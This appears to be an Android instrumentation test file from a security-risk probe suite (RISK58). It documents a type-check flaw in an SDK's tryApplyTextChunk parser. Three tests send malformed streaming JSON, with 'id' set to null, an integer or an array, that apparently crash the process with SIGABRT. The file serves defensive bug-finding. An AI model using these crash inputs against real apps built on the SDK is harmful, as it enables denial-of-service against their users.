package com.amap.agenuiplayground.tests;

import android.app.Activity;
import android.util.Log;

import androidx.test.ext.junit.runners.AndroidJUnit4;
import androidx.test.platform.app.InstrumentationRegistry;
import androidx.test.rule.ActivityTestRule;

import com.amap.agenui.AGenUI;
import com.amap.agenui.render.surface.SurfaceManager;
import com.amap.agenuiplayground.A2UIPlaygroundActivity;

import org.junit.After;
import org.junit.Before;
import org.junit.Rule;
import org.junit.Test;
import org.junit.runner.RunWith;

/**
 * RISK58: tryApplyTextChunk "id" type-mismatch → nlohmann::type_error → SIGABRT
 *
 * VULNERABILITY (introduced in commit 9dca725e, last 20 days):
 * In agenui_component_manager.cpp::tryApplyTextChunk():
 *   if (!json.contains("id") || !json.contains("textChunk")) {
 *       return false;  // Only checks key EXISTS, not its type
 *   }
 *   std::string id = json["id"].get<std::string>();  // ← THROWS if non-string
 *
 * This is a NEW code path (separate from parseComponent) that intercepts
 * streaming text chunks BEFORE parseComponent is called. Any chunk with both
 * "id" (non-string) and "textChunk" fields crashes deterministically.
 *
 * Same pattern as RISK40/41/46/47 but in a different, recently introduced code path.
 * Shared core/ code — affects Android, iOS, and HarmonyOS.
 */
@RunWith(AndroidJUnit4.class)
public class SDKRiskProbeTextChunkTypeMismatchTest {

    private static final String TAG = "RISK58_TextChunkType";

    @Rule
    public ActivityTestRule<A2UIPlaygroundActivity> activityRule =
            new ActivityTestRule<>(A2UIPlaygroundActivity.class);

    private Activity activity;

    @Before
    public void setUp() throws Exception {
        activity = activityRule.getActivity();
        InstrumentationRegistry.getInstrumentation().runOnMainSync(() -> {
            if (!AGenUI.getInstance().isInitialized()) {
                AGenUI.getInstance().initialize(activity.getApplicationContext());
            }
        });
        Thread.sleep(300);
    }

    @After
    public void tearDown() {
        // Don't destroy engine — preserve state for crash analysis
    }

    /**
     * Test 1: "id" field as null with "textChunk" present.
     *
     * json.contains("id") → true (key exists, value is null)
     * json.contains("textChunk") → true
     * json["id"].get<std::string>() → throws nlohmann::json::type_error
     * → std::terminate() → SIGABRT
     *
     * This is the primary attack vector: the simplest malformed chunk that
     * triggers the new tryApplyTextChunk path.
     */
    @Test(timeout = 30000)
    public void test_textChunkIdNull() throws Exception {
        Log.i(TAG, "=== RISK58 Test 1: textChunk with id=null ===");
        String surfaceId = "s_r58_t1";
        SurfaceManager sm = createSurfaceAndWait(surfaceId);
        if (sm == null) return;

        // First, create a valid Text component so the surface is initialized
        String setupJson = "{\"version\":\"v0.9\",\"updateComponents\":{\"surfaceId\":\"" + surfaceId
                + "\",\"components\":["
                + "{\"id\":\"txt1\",\"component\":\"Text\",\"attributes\":{\"text\":\"\\\"hello\\\"\"}}"
                + "]}}";
        Log.i(TAG, "Setup: creating valid Text component");
        sm.beginTextStream();
        sm.receiveTextChunk(setupJson);
        sm.endTextStream();
        Thread.sleep(500);

        // Now send the malicious chunk: "id": null + "textChunk" present + valid "component"
        // Must have valid "component" field to pass Surface::updateComponents() gate.
        // This hits tryApplyTextChunk() BEFORE parseComponent() in ComponentManager.
        String attackJson = "{\"version\":\"v0.9\",\"updateComponents\":{\"surfaceId\":\"" + surfaceId
                + "\",\"components\":["
                + "{\"id\":null,\"component\":\"Text\",\"textChunk\":\"world\"}"
                + "]}}";

        Log.i(TAG, "Attack: sending textChunk with null id, JSON=" + attackJson);
        sm.beginTextStream();
        sm.receiveTextChunk(attackJson);
        sm.endTextStream();

        Thread.sleep(2000);
        Log.i(TAG, "Test 1 survived (unexpected if bug exists) — process still alive");
    }

    /**
     * Test 2: "id" as integer with "textChunk" present.
     *
     * json["id"].get<std::string>() throws on integer type.
     */
    @Test(timeout = 30000)
    public void test_textChunkIdInteger() throws Exception {
        Log.i(TAG, "=== RISK58 Test 2: textChunk with id=12345 ===");
        String surfaceId = "s_r58_t2";
        SurfaceManager sm = createSurfaceAndWait(surfaceId);
        if (sm == null) return;

        // Setup valid component
        String setupJson = "{\"version\":\"v0.9\",\"updateComponents\":{\"surfaceId\":\"" + surfaceId
                + "\",\"components\":["
                + "{\"id\":\"txt1\",\"component\":\"Text\",\"attributes\":{\"text\":\"\\\"hello\\\"\"}}"
                + "]}}";
        sm.beginTextStream();
        sm.receiveTextChunk(setupJson);
        sm.endTextStream();
        Thread.sleep(500);

        // Attack: "id": 12345 (integer, not string) + valid "component" to pass Surface gate
        String attackJson = "{\"version\":\"v0.9\",\"updateComponents\":{\"surfaceId\":\"" + surfaceId
                + "\",\"components\":["
                + "{\"id\":12345,\"component\":\"Text\",\"textChunk\":\"world\"}"
                + "]}}";

        Log.i(TAG, "Attack: sending textChunk with integer id");
        sm.beginTextStream();
        sm.receiveTextChunk(attackJson);
        sm.endTextStream();

        Thread.sleep(2000);
        Log.i(TAG, "Test 2 survived (unexpected if bug exists)");
    }

    /**
     * Test 3: "id" as array with "textChunk" present.
     *
     * json["id"].get<std::string>() throws on array type.
     */
    @Test(timeout = 30000)
    public void test_textChunkIdArray() throws Exception {
        Log.i(TAG, "=== RISK58 Test 3: textChunk with id=[\"a\"] ===");
        String surfaceId = "s_r58_t3";
        SurfaceManager sm = createSurfaceAndWait(surfaceId);
        if (sm == null) return;

        // Setup
        String setupJson = "{\"version\":\"v0.9\",\"updateComponents\":{\"surfaceId\":\"" + surfaceId
                + "\",\"components\":["
                + "{\"id\":\"txt1\",\"component\":\"Text\",\"attributes\":{\"text\":\"\\\"hello\\\"\"}}"
                + "]}}";
        sm.beginTextStream();
        sm.receiveTextChunk(setupJson);
        sm.endTextStream();
        Thread.sleep(500);

        // Attack: "id": ["a","b"] (array, not string) + valid "component" to pass Surface gate
        String attackJson = "{\"version\":\"v0.9\",\"updateComponents\":{\"surfaceId\":\"" + surfaceId
                + "\",\"components\":["
                + "{\"id\":[\"a\",\"b\"],\"component\":\"Text\",\"textChunk\":\"world\"}"
                + "]}}";

        Log.i(TAG, "Attack: sending textChunk with array id");
        sm.beginTextStream();
        sm.receiveTextChunk(attackJson);
        sm.endTextStream();

        Thread.sleep(2000);
        Log.i(TAG, "Test 3 survived (unexpected if bug exists)");
    }

    // ===== Helper =====

    private SurfaceManager createSurfaceAndWait(String surfaceId) throws Exception {
        final SurfaceManager sm = new SurfaceManager(activity);
        if (sm == null) {
            Log.e(TAG, "Failed to create SurfaceManager");
            return null;
        }

        String createSurface = "{\"createSurface\":{\"surfaceId\":\"" + surfaceId + "\",\"catalogId\":\"test\"}}";
        sm.beginTextStream();
        sm.receiveTextChunk(createSurface);
        sm.endTextStream();

        Thread.sleep(200);
        return sm;
    }
}
